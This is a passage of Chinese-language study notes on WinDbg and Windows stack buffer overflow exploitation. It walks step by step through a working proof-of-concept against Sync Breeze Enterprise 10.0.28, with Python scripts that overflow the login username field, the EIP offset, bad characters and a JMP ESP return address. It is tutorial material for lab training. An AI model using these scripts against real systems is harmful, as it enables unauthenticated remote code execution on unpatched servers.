> WinDbg 預設以 HEX 解讀沒有特別指定格式的數字，因此這裡的 18 是十六進位的 0x18，也就是十進位的 24\
> `>> 18` 是右移 0x18 bits 不是右移 18 個十進位位元
> >`0x77269BC0 >> 24 = 0x77` 右移 24 bits，移除最低的 24 bits，保留高位元部分

其他 `?` 運算\
![image](https://hackmd.io/_uploads/Skh7wPXhGx.png)

### Data Output Format
同一個數值，可以用十六進位、十進位、二進位等不同方式呈現\
需要在數值、記憶體位元組與可讀字串之間轉換
- 預設數字基底是十六進位
- 0n：後面的數字使用十進位解讀
- 0y：後面的數字使用二進位解讀

(`0x41` = ASCII 'A')
```dbg
0:000> ? 41414141
Evaluate expression: 1094795585 = 41414141

0:000> ? 0n41414141
Evaluate expression: 41414141 = 0277edfd

0:000> ? 0y1110100110111
Evaluate expression: 7479 = 00001d37
```
> 範例 1：十六進位轉十進位 `0x41414141=1094795585`\
> 範例 2：十進位轉十六進位 `41414141₁₀ = 0x0277EDFD`\
> 範例 3：二進位轉換 `1110100110111₂ = 7479₁₀ = 0x1D37`


使用 `.formats` 一次查看多種格式
```dbg
0:000> .formats 41414141
Evaluate expression:
  Hex:     41414141
  Decimal: 1094795585
  Octal:   10120240501
  Binary:  01000001 01000001 01000001 01000001
  Chars:   AAAA
  Time:    Fri Sep 10 07:53:05 2004
  Float:   low 12.0784 high 0
  Double:  5.40901e-315
```

### Pseudo Registers
[Pseudo Registers](https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/pseudo-register-syntax)（偽暫存器）不是 CPU 真正的暫存器，而是 WinDbg 提供的變數

前面已使用過 `@$teb`, `@$peb`是 WinDbg 提供的特殊偽暫存器，與目前 Thread 的 TEB、目前 process 的 PEB 有關

WinDbg 提供 20 個使用者可用的偽暫存器：`$t0` 到 `$t19` (可以當成 debug 過程中的暫存變數)

舉個三個步驟的🌰：\
1.計算 41414141 - 414141
2.將結果乘以十進位的 10
3.將結果右移 8 bit
```dbg
0:000> ? ((41414141 - 414141) * 0n10) >> 8
Evaluate expression: 42598400 = 028a0000
```

同樣的計算也可以使用 Pseudo Registers 完成
```dbg
0:000> r @$t0 = (41414141 - 414141) * 0n10

0:000> r @$t0
$t0=8a000000*

0:000> ? @$t0 >> 8
Evaluate expression: 42598400 = 028a0000
```
# Exploiting Stack Overflows
Windows 使用者模式漏洞開發的核心實作：Stack [Buffer Overflow](https://en.wikipedia.org/wiki/Buffer_overflow)（堆疊緩衝區溢位）

- 第一階段：造成程式崩潰
建立 PoC 確認輸入能觸發記憶體破壞。
- 第二階段：控制 CPU 暫存器
分析輸入如何影響堆疊、返回位址與 EIP。
- 第三階段：控制執行流程
逐步建立可重現、可控制的利用方式。
- 第四階段：可靠的遠端程式碼執行
將前面的分析應用到 [Sync Breeze](http://www.syncbreeze.com/) 的漏洞利用實驗。

## Stack Overflows Introduction
舉個 🌰
```c
#include <stdio.h>
#include <string.h>

int main(int argc, char *argv[])
{
	char buffer[64];

	if (argc < 2)
	{
		printf("Error - You must supply at least one argument\n");
		
		return 1;
	}
	
	strcpy(buffer, argv[1]);
	
  return 0;
}
```
> - `argc`: 命令列參數的數量
> - `argv`: 指向命令列參數字串的指標陣列
>
>例如 `vuln.exe HELLO`:\
>argv[0] = "vuln.exe"\
>argv[1] = "HELLO"\
>argc    = 2
>
>- `char buffer[64]`：建立緩衝區，宣告了可以容納 64 個 char 元素的陣列\
>buffer 是函式內的區域變數（[local variable](https://en.wikipedia.org/wiki/Local_variable)）
>
> ‼️ 漏洞的關鍵: `strcpy(buffer, argv[1]);`\
> [strcpy](https://linux.die.net/man/3/strcpy)() 會將來源字串複製到目的緩衝區，直到遇到字串結尾的 null character（\0）\
> "沒有檢查來源字串的長度是否超過 buffer 的容量"

![image](https://hackmd.io/_uploads/rke82L4hfg.png)

>[!tip] Stack Buffer Overflow
>若傳遞給主函數的參數長度為 64 個字元，程式將按預期運行並正常退出。\
>🥚 程式沒有對輸入長度進行檢查。代表如果參數長度超過 64 個字元（例如 80 位元組），則目標緩衝區相鄰的堆疊空間的一部分將被剩餘的 16 個字元覆蓋，從而導致陣列溢出
>![strcpy_buffer_1MB](https://hackmd.io/_uploads/B1ugaLNnMl.png)\
>被覆寫的資料可能包括其他區域變數、儲存的暫存器值、堆疊框架資訊，甚至函式的返回位址。實際會覆寫哪些內容，取決於編譯器產生的堆疊配置與輸入長度

EIP register 是由 CPU 在 assembly level 直接 code execution 的位置。因此取得 EIP 控制權可以執行任何想要的 assembly code，甚至執行 [shellcode](https://en.wikipedia.org/wiki/Shellcode)

## Installing the Sync Breeze Application
建立測試環境，開始分析輸入如何影響程序記憶體與執行流程

1. 安裝 Sync Breeze Enterprise 10.0.28 
![image](https://hackmd.io/_uploads/r1TdHDEhfx.png)

2. 啟用 Sync Breeze Web Server
![image](https://hackmd.io/_uploads/rkLnrDV3Mg.png)
![image](https://hackmd.io/_uploads/Sko3rPVnGl.png)

3. 如何重新啟動服務
在後續 exploit 開發過程中，Sync Breeze 可能會多次崩潰。
快速重新啟動服務使用 Windows 的服務管理工具 `Services.msc `

## Crashing the Sync Breeze Application
安裝 Sync Breeze Enterprise 後，接著會使用 Kali 傳送 HTTP request，讓 Windows 上的 syncbrs.exe 發生當機，再透過 WinDbg 觀察 CPU 暫存器，確認是否已經控制到 EIP\
(來自 2017 [buffer overflow vulnerability](https://www.exploit-db.com/exploits/43200): Pre-authentication Buffer Overflow 漏洞位置是 HTTP POST 中的 username 。不需要知道正確帳號或密碼，就能觸發程式崩潰)

常見漏洞發現技術:
- Source Code Review 原始碼審查: 能取得原始碼時，可以直接檢查不安全的資料處理方式。
- [Reverse Engineering](https://en.wikipedia.org/wiki/Reverse_engineering) 逆向工程: 分析編譯後的程式、組合語言及執行行為。
- [Fuzzing](https://en.wikipedia.org/wiki/Fuzzing) 模糊測試: 自動或半自動產生大量不同輸入，觀察程式是否出現異常。

Python PoC code:
```python
#!/usr/bin/python3
import socket
import sys

try:
  server = sys.argv[1]
  port = 80
  size = 800
  inputBuffer = b"A" * size
  content = b"username=" + inputBuffer + b"&password=A"

  buffer = b"POST /login HTTP/1.1\r\n"
  buffer += b"Host: " + server.encode() + b"\r\n"
  buffer += b"User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
  buffer += b"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
  buffer += b"Accept-Language: en-US,en;q=0.5\r\n"
  buffer += b"Referer: http://10.11.0.22/login\r\n"
  buffer += b"Connection: close\r\n"
  buffer += b"Content-Type: application/x-www-form-urlencoded\r\n"
  buffer += b"Content-Length: "+ str(len(content)).encode() + b"\r\n"
  buffer += b"\r\n"
  buffer += content

  print("Sending evil buffer...")
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((server, port))
  s.send(buffer)
  s.close()

  print("Done!")

except socket.error:
  print("Could not connect!")
```
> - `server`: 從第一個命令列參數取得的目標 IP 或主機名稱
> - `port`: HTTP 服務的 TCP Port 80
> - `size`: 要送出的 username 資料長度，設定為 800 bytes
>```bash
>python3 stack_overflow_0x01.py 192.168.120.10
>```
>- `inputBuffer = b"A" * 800`:會產生由 800 個 ASCII A 組成的位元組序列
>- `socket.AF_INET`：使用 IPv4
>- `socket.SOCK_STREAM`：使用 TCP
>- `s.connect((server, port))`：連接目標主機的 TCP/80
>- `s.send(buffer)`：傳送 HTTP 請求
>- `s.close()`：關閉 Socket

建置好 PoC code 後，為驗證是否如預期運行，先將 Dubugger 附加到目標process\
由於 syncbrs.exe 以本機系統帳號執行 ，需要以管理員權限執行 WinDbg
![image](https://hackmd.io/_uploads/SyZr5YVnGl.png)

執行 PoC\
![image](https://hackmd.io/_uploads/Sykkst43Gx.png)

在 32-bit x86 架構中，EIP（Extended Instruction Pointer）保存目前的指令執行位置
```dbg
(ae8.104): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=00000001 ebx=00000000 ecx=00263a54 edx=00000358 esi=0025bf86 edi=00a47420
eip=41414141 esp=0176745c ebp=0025c6b8 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010202
41414141 ??              ???
```

![image](https://hackmd.io/_uploads/Syg1CcKV2Ml.png)

## Win32 Buffer Overflow Exploitation
確認了 EIP 被覆寫，說明為什麼控制 EIP 是利用漏洞的重要目標

### A Word About DEP, ASLR, and CFG
Windows 三種 防護機制：
- [DEP](https://docs.microsoft.com/en-us/windows/win32/memory/data-execution-prevention)：Data Execution Prevention
DEP 使用硬體和軟體機制，限制某些記憶體區域被當成程式碼執行。當程式試圖從不可執行的資料頁面執行指令時，可能會引發例外\
即使資料成功寫入，CPU 也不能直接把它當成指令執行
    - 可讀／可寫的資料頁面，不代表可執行
    - 成功覆寫 EIP，不代表 EIP 指向的位置可以執行程式碼
    - DEP 的目的之一，就是阻止從不具執行權限的資料頁面執行指令
- [ASLR](https://blogs.msdn.microsoft.com/michael_howard/2006/05/26/address-space-layout-randomization-in-windows-vista/)：Address Space Layout Randomization
ASLR 會隨機化程式或相關模組的載入位址，使利用漏洞時較難事先確定某個函式或模組所在的記憶體位址
    - 沒有 ASLR：在特定環境中，該 DLL 可能每次都載入相同基底位址
    - 啟用 ASLR：DLL 的基底位址可能改變，函式的實際位址也會隨之改變

- [CFG](https://docs.microsoft.com/en-us/windows/win32/secbp/control-flow-guard)：Control Flow Guard
CFG 是 Microsoft 的控制流程完整性防護機制之一，用來驗證受保護的間接呼叫等控制流程轉移是否指向允許的目標
間接呼叫: x86 Assembly 可直接呼叫可以指定固定目標 Ex. `call 00401000`，間接呼叫可以透過暫存器取得目標位址 Ex. `call eax`

![image](https://hackmd.io/_uploads/r1Isz5N3fx.png)

### Controlling EIP
目前已知傳送 800 個 A 可以使 Sync Breeze 發生崩潰，並看到：
`eip=41414141` 代表 EIP 已經成功覆寫，但還未知："**輸入資料中的第幾個位元組，會剛好覆寫 EIP 的四個位元組？**" 👉🏻 這個位置就是 **Offset**

如何找 Offset？
- Way1：Binary Tree Analysis
二分法 前 400 bytes：A 後 400 bytes：B \
反覆縮小範圍，直到找出精確的四個 bytes

- Way2：使用 Metasploit Pattern
利用 [Metasploit Framework](https://www.metasploit.com/) 的腳本 pattern_create.rb 產生一串具有可辨識特徵的非重複 Pattern
```
msf-pattern_create -h
```
![image](https://hackmd.io/_uploads/SJUpDqVhze.png)


產生 800 bytes 的 Pattern： `msf-pattern_create -l 800`
> 當其中四個 bytes 覆寫 EIP 時，就可以透過這個獨特序列反查它在原始輸入中的位置

更新 Python PoC，用新字串取代現有緩衝區
![image](https://hackmd.io/_uploads/ry6269V2fl.png)

Windbg:
```dbg
(1600.174): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=00000001 ebx=00000000 ecx=00653b14 edx=00000358 esi=0064c006 edi=00a27420
eip=42306142 esp=0032745c ebp=0064c6b8 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010202
42306142 ??              ???
```
> eip=42306142

這個值對應 Pattern 中的 `B0aB`。Little Endian：x86 CPU 將多位元組數值存入記憶體時，最低有效位元組會放在最低記憶體位址。\
因此，當 WinDbg 顯示 EIP 數值時，不能直接把十六進位數字從左至右當成原始輸入的字元順序；需要按照小端序還原位元組
```
msf-pattern_offset -l 800 -q 42306142
```
![image](https://hackmd.io/_uploads/SyMD1j43zl.png)
> 表示 Pattern 的第 780 個 Offset 開始的位置，對應到覆寫 EIP 的四個 bytes

驗證 Offset 位置:
- filler	780 bytes	填滿 EIP 之前的資料
- eip	4 bytes	使用 B 作為可辨識標記
- buf	16 bytes	檢查 EIP 之後的資料是否仍在緩衝區中
```python
#!/usr/bin/python3
import socket
import sys

try:
  server = sys.argv[1]
  port = 80
  size = 800

  filler = b"A" * 780
  eip = b"B" * 4
  buf = b"C" * 16
  inputBuffer = filler + eip + buf
  content = b"username=" + inputBuffer + b"&password=A"

  buffer = b"POST /login HTTP/1.1\r\n"
  buffer += b"Host: " + server.encode() + b"\r\n"
  buffer += b"User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
  buffer += b"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
  buffer += b"Accept-Language: en-US,en;q=0.5\r\n"
  buffer += b"Referer: http://10.11.0.22/login\r\n"
  buffer += b"Connection: close\r\n"
  buffer += b"Content-Type: application/x-www-form-urlencoded\r\n"
  buffer += b"Content-Length: "+ str(len(content)).encode() + b"\r\n"
  buffer += b"\r\n"
  buffer += content

  print("Sending evil buffer...")
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((server, port))
  s.send(buffer)
  s.close()

  print("Done!")

except socket.error:
  print("Could not connect!")

```
Windbg:
```dbg
(558.104): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=00000001 ebx=00000000 ecx=001f2e44 edx=00000358 esi=001ec1c6 edi=00a87420
eip=42424242 esp=0056745c ebp=001ec6b8 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010202
42424242 ??              ???
```
如果 Offset 正確，WinDbg 應顯示：`eip=42424242`
👉🏻 B 的 ASCII 位元組值是 0x42

### Locating Space for Our Shellcode
可以讓 EIP 變成指定的值後，注入 Shellcode
1. 輸入資料被放在目標程序的哪個記憶體位置？
2. 是否有足夠空間容納預期要執行的程式碼？

```dbg
0:001> r
eax=00000001 ebx=00000000 ecx=001f2e44 edx=00000358 esi=001ec1c6 edi=00a87420
eip=42424242 esp=0056745c ebp=001ec6b8 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010202
42424242 ??              ???

0:001> dds esp L3
0056745c  43434343
00567460  43434343
00567464  43434343

0:001> dds esp -10 L8
0056744c  41414141
00567450  41414141
00567454  42424242
00567458  43434343
0056745c  43434343
00567460  43434343
00567464  43434343
00567468  00a7ba00
```
> - `dds esp L3`: 一個 DWORD 是 4 bytes，所以 L3 一共顯示 12 bytes

>[!Note]
>常見的 Shellcode 可能需要約 350–400 bytes 的空間，而原始 PoC 只在 EIP 後放了 16 個 C。(16 bytes 長度不足以驗證 Shellcode 空間)

在 PoC script 中新增「D」字元作為 shellcode 的佔位符，且總長度增加到 1500 bytes
```python
#!/usr/bin/python3
import socket
import sys

try:
  server = sys.argv[1]
  port = 80
  size = 800
  
  filler = b"A" * 780
  eip = b"B" * 4
  offset = b"C" * 4
  shellcode = b"D" * (1500 - len(filler) - len(eip) - len(offset))
  inputBuffer = filler + eip + offset + shellcode
  content = b"username=" + inputBuffer + b"&password=A"
...
```
Windbg:
```dbg
(a78.a24): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=00000001 ebx=00000000 ecx=0022121c edx=00000358 esi=0021c106 edi=00ad7420
eip=42424242 esp=0056745c ebp=0021c6b8 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010202
42424242 ??              ???

0:001> dds esp - 8 L7
00567454  42424242
00567458  43434343
0056745c  44444444
00567460  44444444
00567464  44444444
00567468  44444444
0056746c  44444444
```
![image](https://hackmd.io/_uploads/rkhixhE3fg.png)
> ESP 指向的是「D」字元 `0x44`

這裡的 D 並不是真正的 Shellcode，只是用來觀察記憶體布局的標記\
計算: 1500 - 780 - 4 - 4 = 712 (D 佔 712 bytes)
```dbg
0:001> dds esp L4
0056745c  44444444
00567460  44444444
00567464  44444444
00567468  44444444
0:001> dds esp+2c0 L4
0056771c  44444444
00567720  44444444
00567724  00000000
00567728  00000000
0:001> ? 00567724 - 0056745c
Evaluate expression: 712 = 000002c48
```
![image](https://hackmd.io/_uploads/r1xm-3V2Me.png)

### Checking for Bad Characters
Bad Characters 是指某些位元組在傳送或複製過程中，會使輸入資料遭到截斷、改變或破壞，導致 Exploit 無法依照預期運作
- 0x00：Null Byte
- 0x0D：Carriage Return

將 PoC 中的 D 替換為除 0x00 之外的所有可能的十六進位字元\
```python
#!/usr/bin/python3
import socket
import sys

try:
  server = sys.argv[1]
  port = 80
  size = 800
  
  filler = b"A" * 780
  eip = b"B" * 4
  offset = b"C" * 4
  badchars = (
    b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
    b"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
    b"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
    b"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
    b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
    b"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
    b"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
    b"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
    b"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
    b"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
    b"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
    b"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
    b"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
    b"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
    b"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
    b"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")
  #shellcode = b"D" * (1500 - len(filler) - len(eip) - len(offset))
  inputBuffer = filler + eip + offset + badchars

  buffer = b"POST /login HTTP/1.1\r\n"
  buffer += b"Host: " + server.encode() + b"\r\n"
  buffer += b"User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
  buffer += b"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
  buffer += b"Accept-Language: en-US,en;q=0.5\r\n"
  buffer += b"Referer: http://10.11.0.22/login\r\n"
  buffer += b"Connection: close\r\n"
  buffer += b"Content-Type: application/x-www-form-urlencoded\r\n"
  buffer += b"Content-Length: "+ str(len(content)).encode() + b"\r\n"
  buffer += b"\r\n"
  buffer += content

  print("Sending evil buffer...")
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((server, port))
  s.send(buffer)
  s.close()

  print("Done!")

except socket.error:
  print("Could not connect!")
```
![image](https://hackmd.io/_uploads/B1z0Sn42zg.png)


```dbg
0:008> db esp - 10 L20
0149744c  41 41 41 41 41 41 41 41-42 42 42 42 43 43 43 43  AAAAAAAABBBBCCCC
0149745c  01 02 03 04 05 06 07 08-09 00 a6 00 60 bd a6 00  ............`...
```
> - `db`：以 Byte 格式顯示記憶體。
> - `esp - 10`：從 ESP 往前 0x10 bytes 開始。
> - `L20`：顯示 0x20 bytes，也就是 32 bytes
>> 十六進位值 0x01 到 0x09 已寫入堆疊記憶體緩衝區。🥚 下一個字元 0x0A 卻消失，它本應位於位址 `0x01497465`
>> " 0x0A 在 HTTP 中屬於 Line Feed（LF）" 被截斷

>[!Important]
>Bad Characters:\
>![image](https://hackmd.io/_uploads/HkO3v3E2fe.png)


### Redirecting the Execution Flow
已認證：
- EIP 可被覆寫
- ESP 指向的附近有提供的輸入資料
- 輸入長度增加後，有更大的資料區域可以使用。
- 已辨識出教材所述的 Bad Characters

如何讓執行流程轉向 ESP 指向的資料區域？
👉🏻 直接把某一次觀察到的 ESP 位址寫入 EIP 並不可靠，因為 ESP 可能隨執行環境、thread 堆疊配置及每次執行而變動。
因此，需要思考的是一種能夠轉移執行流程、又不依賴某次 ESP 固定值的方式。

### Finding a Return Address
#### - JMP ESP 的概念
x86 指令：`jmp esp`

🧠 將執行流程轉移到 ESP 目前指向的位址。\
JMP ESP 使用的是執行當下 ESP 暫存器中的值，因此即使 ESP 的實際數值改變，指令仍會跳到當下 ESP 所指的位置。

#### - 檢查 PE Header
Windows 可執行檔與 DLL 通常使用 PE（[Portable Executable](https://www.aldeid.com/wiki/PE-Portable-executable)）格式\
可透過 PE Header 中的 DllCharacteristics 欄位，檢查與部分記憶體防護相關的資訊

在 windbg 中可使用 `lm m syncbrs` 查看指定模組的載入資訊\
dt ntdll!_[IMAGE_DOS_HEADER](https://www.nirsoft.net/kernel_struct/vista/IMAGE_DOS_HEADER.html) 檢視 DOS Header 的欄位
```dbg
0:008> lm m syncbrs
Browse full module list
start    end        module name
00400000 00462000   syncbrs    (deferred)          

0:008> dt ntdll!_IMAGE_DOS_HEADER 0x00400000
   +0x000 e_magic          : 0x5a4d
   +0x002 e_cblp           : 0x90
   +0x004 e_cp             : 3
   +0x006 e_crlc           : 0
   +0x008 e_cparhdr        : 4
   +0x00a e_minalloc       : 0
   +0x00c e_maxalloc       : 0xffff
   +0x00e e_ss             : 0
   +0x010 e_sp             : 0xb8
   +0x012 e_csum           : 0
   +0x014 e_ip             : 0
   +0x016 e_cs             : 0
   +0x018 e_lfarlc         : 0x40
   +0x01a e_ovno           : 0
   +0x01c e_res            : [4] 0
   +0x024 e_oemid          : 0
   +0x026 e_oeminfo        : 0
   +0x028 e_res2           : [10] 0
   +0x03c e_lfanew         : 0n232
   
0:008> ? 0n232
Evaluate expression: 232 = 000000e8
```
> - `0x00400000` 是 syncbrs.exe 的載入基底位址
> - `e_lfanew` 位於 DOS Header 的偏移 0x3C，其值表示 PE Header 相對於映像基底的位置
> - 將 232 轉換為十六進位
>> 所以 PE Header 位於：`0x00400000 + 0xE8`

檢視 [IMAGE_NT_HEADERS](https://docs.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-image_nt_headers32) 及 [IMAGE_OPTIONAL_HEADER](https://docs.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-image_optional_header32)，其中包含 DllCharacteristics 欄位

```dbg
0:008> dt ntdll!_IMAGE_NT_HEADERS 0x00400000+0xe8
   +0x000 Signature        : 0x4550
   +0x004 FileHeader       : _IMAGE_FILE_HEADER
   +0x018 OptionalHeader   : _IMAGE_OPTIONAL_HEADER
```
> 0x4550 對應 PE Signature 的兩個 ASCII 字元 PE\
> +0x018 OptionalHeader   : _IMAGE_OPTIONAL_HEADER

在 Offset 0x18 ，找到了所需的 IMAGE_OPTIONAL_HEADER 結構，其中包含 DllCharacteristics 欄位
```dbg
0:008> dt ntdll!_IMAGE_OPTIONAL_HEADER 0x00400000+0xe8+0x18
   +0x000 Magic            : 0x10b
   +0x002 MajorLinkerVersion : 0x6 ''
   +0x003 MinorLinkerVersion : 0 ''
   +0x004 SizeOfCode       : 0x32000
   +0x008 SizeOfInitializedData : 0x2f000
   +0x00c SizeOfUninitializedData : 0
   +0x010 AddressOfEntryPoint : 0x30484
   +0x014 BaseOfCode       : 0x1000
   +0x018 BaseOfData       : 0x33000
   +0x01c ImageBase        : 0x400000
   +0x020 SectionAlignment : 0x1000
   +0x024 FileAlignment    : 0x1000
   +0x028 MajorOperatingSystemVersion : 4
   +0x02a MinorOperatingSystemVersion : 0
   +0x02c MajorImageVersion : 0
   +0x02e MinorImageVersion : 0
   +0x030 MajorSubsystemVersion : 4
   +0x032 MinorSubsystemVersion : 0
   +0x034 Win32VersionValue : 0
   +0x038 SizeOfImage      : 0x62000
   +0x03c SizeOfHeaders    : 0x1000
   +0x040 CheckSum         : 0
   +0x044 Subsystem        : 3
   +0x046 DllCharacteristics : 0
   +0x048 SizeOfStackReserve : 0x100000
   +0x04c SizeOfStackCommit : 0x1000
   +0x050 SizeOfHeapReserve : 0x100000
   +0x054 SizeOfHeapCommit : 0x1000
   +0x058 LoaderFlags      : 0
   +0x05c NumberOfRvaAndSizes : 0x10
   +0x060 DataDirectory    : [16] _IMAGE_DATA_DIRECTORY
```
> +0x046 DllCharacteristics : 0
> > 表示syncbrs.exe 可執行檔沒有啟用任何保護措施\
> > 但也不能只憑 DllCharacteristics = 0 就斷言整個 process 完全沒有任何防護。實際防護狀態仍可能涉及 OS、Process policy、載入的 DLL 與其他執行環境設定


當前 syncbrs.exe 本身不是合適的返回位址\
WHY? 
>[!Important]
偏好載入位址是：`ImageBase = 0x00400000`\
模組中的程式碼位址通常落在 0x004XXXXX 一帶。在這種情況下，位址的位元組表示會包含 0x00，例如：`0x00401234`\
在 x86 Little-Endian 中，這個位址的位元組順序是：`34 12 40 00`\
最後一個位元組 00 可能觸發 Bad Character 問題。
👉🏻 尋找另一個載入位址不含 NUL 位元組、且沒有啟用相關緩解機制的模組

#### - 使用 Process Hacker 檢查 Mitigations
[Process Hacker](https://processhacker.sourceforge.io/)：
1. 以系統管理員身分啟動 Process Hacker
2. 找到 syncbrs.exe 程序
3. 開啟程序的 Properties
![image](https://hackmd.io/_uploads/Bk0yMWBnGx.png)
4. 在 General 頁籤檢查 Mitigation Policies
5. 再開啟 Details，檢查相關防護資訊
![image](https://hackmd.io/_uploads/B1B8mbHnGl.png)
6. 到 Modules 頁籤查看已載入的 DLL，逐一檢查模組的相關設定
![image](https://hackmd.io/_uploads/SkeuXWSnGx.png)

>[!Note]
>若 Process 啟用了 DEP（Data Execution Prevention），那麼單純跳到堆疊上的資料區域，通常不能直接執行指令。\
>這種情況 Return address 需要選擇位於可執行程式碼區段的指令，例如具有讀取與執行權限的 .text 區段。🥚 即使位址位於 .text，也不代表整個 Exploit 一定能成功；還需要考慮 ASLR、控制流程保護、Bad Characters，以及目標程序的實際記憶體權限。

#### - 尋找 JMP ESP 的 Opcode
##### 1. NASM Shell
使用 Metasploit 提供的 NASM Shell ruby script msf-nasm_shell
```
┌──(chw💲CHW)-[~]
└─$ msf-nasm_shell
nasm > jmp esp
00000000  FFE4              jmp esp
```
代表 JMP ESP 的兩個 opcode 位元組為：FF E4 (Machine Code)

##### 2. 尋找 LIBSPP.DLL 的記憶體範圍
WinDbg 
```dbg
0:007> lm m libspp
Browse full module list
start    end        module name
10000000 10223000   libspp   C (export symbols)       C:\Program Files\Sync Breeze Enterprise\bin\libspp.dll
```
代表 LIBSPP.DLL 在這次 process 執行中的記憶體範圍為：
- 起始位址：0x10000000
- 結束位址：0x10223000

##### 3. 使用 s -b 搜尋指令位元組
```dbg
0:007> s -b 10000000 10223000 0xff 0xe4
10090c83  ff e4 0b 09 10 02 0c 09-10 24 0c 09 10 46 0c 09  .........$...F..
```
> - `s`	搜尋記憶體
> - `-b`	以 Byte 為單位搜尋
> - `10000000`	搜尋起始位址
> - `10223000`	搜尋結束位址
> - `0xff 0xe4`	要尋找的連續位元組

從 0x10090C83 開始的記憶體內容符合 FF E4

反組譯驗證 `u 10090c83`
```
0:007> u 10090c83
libspp!SCA_FileScout::GetStatusValue+0xb3:
10090c83 ffe4            jmp     esp
10090c85 0b09            or      ecx,dword ptr [ecx]
10090c87 1002            adc     byte ptr [edx],al
10090c89 0c09            or      al,9
10090c8b 10240c          adc     byte ptr [esp+ecx],ah
10090c8e 0910            or      dword ptr [eax],edx
10090c90 46              inc     esi
10090c91 0c09            or      al,9
```
> 可以確認 `0x10090C83` 確實對應 JMP ESP 指令

🎯 在 crash 時將 EIP 重定向到此位址，將執行 JMP ESP 指令引到我們的 shellcode 佔位符

PoC exploit:
>[!Tip]
>Little-Endian 的規則是：最低有效位元組放在最低記憶體位址
>`eip = b"\x83\x0c\x09\x10"` \
>這四個位元組代表的 32 位元整數是：`0x10090C83`\
>>也可以另一種寫法 `eip = struct.pack("<I", 0x10090c83) #Little-endian format`
```python
#!/usr/bin/python3
import socket
import sys

try:
  server = sys.argv[1]
  port = 80
  size = 800
  
  filler = b"A" * 780
  eip = b"\x83\x0c\x09\x10" # 0x10090c83 - JMP ESP
  offset = b"C" * 4
  shellcode = b"D" * (1500 - len(filler) - len(eip) - len(offset))
  inputBuffer = filler + eip + offset + shellcode
  content = b"username=" + inputBuffer + b"&password=A"

  buffer = b"POST /login HTTP/1.1\r\n"
  buffer += b"Host: " + server.encode() + b"\r\n"
  buffer += b"User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
  buffer += b"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
  buffer += b"Accept-Language: en-US,en;q=0.5\r\n"
  buffer += b"Referer: http://10.11.0.22/login\r\n"
  buffer += b"Connection: close\r\n"
  buffer += b"Content-Type: application/x-www-form-urlencoded\r\n"
  buffer += b"Content-Length: "+ str(len(content)).encode() + b"\r\n"
  buffer += b"\r\n"
  buffer += content

  print("Sending evil buffer...")
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((server, port))
  s.send(buffer)
  s.close()

  print("Done!")

except socket.error:
  print("Could not connect!")
```
> D 的長度計算為：1500-780-4-4=712\
